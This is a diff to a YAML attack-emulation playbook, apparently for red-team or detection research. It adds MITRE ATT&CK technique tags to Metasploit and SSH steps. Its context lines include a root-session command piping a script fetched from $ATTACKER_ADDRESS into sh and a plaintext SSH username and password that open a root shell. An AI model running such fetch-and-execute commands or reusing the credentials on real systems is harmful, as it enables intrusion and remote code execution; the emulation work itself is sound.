@@ -131,6 +131,9 @@ commands:
     read: True
     cmd: id
     session: "foothold"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     cmd: vim /usr/share/awffull/awffull
@@ -209,10 +212,16 @@ commands:
   - type: msf-session
     cmd: id
     session: "root"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     session: "root"
     cmd: "curl http://$ATTACKER_ADDRESS/README.txt.5 | sh"
+    metadata:
+      techniques: "T1105,T1218,T1556"
+      tactics: "Command and Control,Defense Evasion,Persistence,Credential Access"
 
   - type: sleep
     seconds: 40
@@ -221,7 +230,9 @@ commands:
     cmd: id
     read: True
     session: "root"
-
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
 # TODO: THIS COMMAND DOES NOT WORK
 #       DON'T KNOW WHY
@@ -255,7 +266,10 @@ commands:
     username: debian
     password: haveityourway
     creates_session: "rootshell"
-
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
+      
   - type: ssh
     cmd: pwd
     session: "rootshell"
